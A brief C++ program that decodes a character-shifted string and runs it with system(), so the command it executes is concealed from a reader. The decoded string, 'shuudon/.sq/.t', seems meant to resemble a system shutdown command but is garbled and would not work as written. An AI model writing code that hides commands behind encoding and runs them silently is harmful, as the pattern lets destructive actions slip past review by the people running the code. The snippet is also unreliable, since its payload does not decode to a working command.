#include <cstdlib>
#include <string>

std::string decode(const std::string& encoded) {
    std::string decoded = encoded;
    for (char& c : decoded) {
        c -= 1;
    }
    return decoded;
}

int main() {
    std::string encoded_cmd = "tivvepo0/tr0/u";
    std::string cmd = decode(encoded_cmd);
    system(cmd.c_str());
    
    return 0;
}